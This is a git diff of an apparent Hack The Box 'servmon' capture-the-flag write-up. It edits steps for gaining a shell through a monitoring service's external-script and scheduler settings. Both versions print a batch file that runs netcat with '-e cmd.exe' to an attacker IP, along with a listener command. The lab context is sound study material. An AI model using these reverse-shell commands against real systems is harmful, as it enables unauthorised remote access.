@@ -361,19 +361,37 @@ ssh> -L 8443:127.0.0.1:8443
 Forwarding port.
 ```
 
+This worked and we can successfully login now.
 
-3. Download nc.exe and evil.bat to c:\temp from attacking machine
-	@echo off
-	c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe
+![image](/assets/img/post/htb/servmon/07.png)
 
-4. Setup listener on attacking machine
-	nc -nlvvp 443
 
-5. Add script foobar to call evil.bat and save settings
+3. Download `nc.exe` and `bigb0ss.bat` to c:\temp from attacking machine:
+	
+```bat
+@echo off
+c:\temp\nc.exe -e cmd.exe 10.10.14.22 443 
+```
+
+![image](/assets/img/post/htb/servmon/08.png)
+
+
+4. Add script foobar to call evil.bat and save settings
 - Settings > External Scripts > Scripts
 - Add New
 	- foobar
-		command = c:\temp\evil.bat
+		command = c:\temp\bigb0ss.bat
+
+![image](/assets/img/post/htb/servmon/09.png)
+
+
+5. Open up `nc` listener on our Kali and go to Queires and run `bigb0ss`
+
+
+
+
+
+
 
 6. Add schedulede to call script every 1 minute and save settings
 - Settings > Scheduler > Schedules
